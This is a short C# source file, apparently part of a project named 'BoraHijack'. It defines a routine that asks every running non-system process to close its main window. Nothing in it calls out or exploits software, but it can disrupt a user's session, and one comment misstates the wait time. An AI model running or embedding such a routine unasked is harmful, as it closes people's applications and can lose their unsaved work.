using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;

namespace BoraHijack
{
    class CloseAllProcess
    {
        public static void MainCAP()
        {
            // List of important processes to exclude
            string[] importantProcesses = new string[]
            {
            "explorer", "System", "Idle", "csrss", "winlogon",
            "services", "lsass", "svchost", "smss", "taskmgr",
            "wininit", "spoolsv", "SearchIndexer"
            };

            var currentProcess = Process.GetCurrentProcess();

            foreach (var process in Process.GetProcesses())
            {
                try
                {
                    if (importantProcesses.Contains(process.ProcessName, StringComparer.OrdinalIgnoreCase))
                        continue;

                    if (process.Id == currentProcess.Id)
                        continue;

                    // try to close everything peacefully
                    process.CloseMainWindow();
                    process.WaitForExit(100); // wait 1 second
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error: {ex.Message}");
                }
            }
        }
    }
}
